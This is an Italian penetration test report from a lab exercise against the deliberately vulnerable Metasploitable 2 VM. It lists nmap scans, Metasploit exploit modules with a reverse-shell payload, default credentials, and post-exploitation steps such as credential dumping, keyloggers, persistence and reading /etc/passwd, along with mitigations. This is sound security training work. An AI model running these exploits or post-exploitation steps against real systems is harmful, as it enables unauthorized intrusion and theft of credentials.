# Penetration Test Report – Metasploitable 2

🗓️ Data: 25/06/2025  
🎯 Target IP: 192.168.75.132  
👤 Tester: ILoveOllyexe

---

## 📘 Descrizione del Progetto

Questo progetto documenta un'attività di penetration testing condotta su Metasploitable 2, una macchina vulnerabile progettata per scopi didattici e laboratori di sicurezza. Il test è stato eseguito in un ambiente virtualizzato e controllato, con lo scopo di identificare, sfruttare e documentare vulnerabilità note attraverso tecniche reali.

---

## 🛠️ Strumenti Utilizzati

| Tool        | Descrizione                                                                 |
|-------------|------------------------------------------------------------------------------|
| Nessus      | Scanner di vulnerabilità commerciale, utilizzato per effettuare la scansione automatica dei servizi esposti e delle vulnerabilità note (CVEs). Sono stati generati report in formato HTML e CSV. |
| Armitage    | GUI per Metasploit Framework, utilizzata per eseguire scansioni, sfruttare vulnerabilità e gestire sessioni post-exploitation in modalità visuale. Ideale per attività di red teaming collaborativo. |
| msfconsole  | Interfaccia CLI del Metasploit Framework. Permette di lanciare exploit manualmente, configurare payload (es. reverse_tcp, meterpreter), stabilire sessioni e post-exploitation. |
| vncviewer   | Client VNC per connettersi alla macchina target tramite GUI remota. Utilizzato per verificare la debolezza dell'autenticazione. |
| nmap        | Utilizzato per la ricognizione e la scansione delle porte e dei servizi attivi. Supporto a script NSE per analisi avanzata. |
| Wireshark   | Sniffer di rete usato per intercettare traffico non cifrato (es. credenziali in chiaro) e comprendere le comunicazioni tra servizi vulnerabili. |
| whois/dig   | Per informazioni OSINT di rete, anche se non essenziali in ambiente locale, inclusi per completezza tecnica. |

---

## 🧭 Metodologia Dettagliata

### 1. Ricognizione Attiva e Passiva
- nmap -sS -sV -T4 -p- 192.168.75.132
- nmap -A -O -sC 192.168.75.132
- Servizi rilevati: SSH, FTP, HTTP, Samba, MySQL, Tomcat, IRC, VNC, RSH
- Banner grabbing e verifica versioni vulnerabili

### 2. Scansione delle Vulnerabilità
- Nessus: vulnerabilità critiche su software obsoleto (Ubuntu 8.04), servizi mal configurati (VNC, RSH), e backdoor note
- Salvataggio report: nessus_output.csv, nessus_report.html

### 3. Sfruttamento delle Vulnerabilità (Exploit)
- msfconsole > use exploit/unix/irc/unreal_ircd_3281_backdoor
- set RHOST 192.168.75.132; set PAYLOAD cmd/unix/reverse; run
- Armitage: attacchi mirati, shell interattive, uso di autorun e funzioni di escalation
- VNC exploit: connessione diretta con vncviewer senza richiesta password
- Exploit SQL Injection su phpMyAdmin (simulato, non distruttivo)

### 4. Post-Exploitation
- Meterpreter: dump credentials, screenshot, keyloggers, persistence
- shell: whoami, netstat -anp, ps aux, cat /etc/passwd
- Enumerazione file sensibili, utenti, servizi schedulati, crontab

### 5. Raccolta Evidenze & Report
- Ogni fase è stata salvata come output testuale o screenshot
- Cartelle organizzate per tool, host, vulnerabilità
- Report redatto in Markdown e convertibile in PDF con pandoc

---

## 🔎 Vulnerabilità Identificate

### 1. UnrealIRCd 3.2.8.1 Backdoor (CVE-2010-2075)
- Criticità: Critical
- Tool: Metasploit
- Exploit: exploit/unix/irc/unreal_ircd_3281_backdoor
- Evidenza: reverse shell ottenuta sulla porta 6667
- Impatto: Esecuzione remota di comandi
- Mitigazione: Disinstallare UnrealIRCd compromesso; verificare hash binari

### 2. Ubuntu 8.04 End of Life
- Criticità: Critical
- Tool: Nessus
- Evidenza: OS detection e warning Nessus
- Rischi: Assenza patch, exposure totale
- Mitigazione: Aggiornamento a distribuzioni supportate (es. Ubuntu 22.04 LTS)

### 3. VNC Server senza protezione (password: "password")
- Criticità: Critical
- Tool: vncviewer
- Impatto: Controllo completo GUI
- Test: vncviewer 192.168.75.132 → accesso immediato
- Mitigazione: Disabilitare VNC o applicare autenticazione + cifratura

### 4. Bind Shell Backdoor (generica)
- Criticità: Critical
- Tool: Nessus, netstat, nmap
- Evidenza: Porta in listening anomala
- Rischio: Shell remota sempre in ascolto

### 5. Apache Tomcat (≤ 5.5.x) + Credenziali Predefinite
- Criticità: Critical
- URL: http://192.168.75.132/admin
- User: tomcat / tomcat
- Impatto: Accesso completo console amministrativa
- Exploitabili con Metasploit: tomcat_mgr_login, tomcat_mgr_upload

### 6. phpMyAdmin SQLi (PMASA-2019-3)
- Criticità: Alta
- Evidenza: Nessus, versione 4.8.4
- Rischio: Bypass autenticazione, SQLi
- Test simulato: manual query injection (no danni)

### 7. rsh Attivo
- Criticità: Alta
- Porta TCP 514
- Nessuna cifratura, autenticazione debole
- Legacy protocol → should be disabled

### 8. Samba Badlock Vulnerability (CVE-2016-2118)
- Criticità: Alta
- Race condition SMB
- Mitigazione: Patch Samba, aggiornamento a versioni ≥ 4.4.2

---

## ✅ Conclusioni e Raccomandazioni

- Il sistema presenta falle critiche in diversi livelli (servizi, SO, credenziali, configurazioni)
- Mitigazioni Prioritarie:
  - Aggiornare o sostituire sistema operativo
  - Rimuovere software obsoleti e non sicuri (IRC, RSH)
  - Cambiare tutte le password di default
  - Limitare accesso tramite firewall e subnetting
  - Abilitare logging e monitoraggio

---

## 📌 Note Finali

- Ambiente: Kali Linux 2024.1 su VirtualBox + Metasploitable 2
- Test svolti in rete host-only, isolata
- Documentazione formattata con markdown

© 2025 – [ILoveOllyexe] – Licenza MIT o CC BY-NC-SA

🔗 LinkedIn: simona-oliva00 |
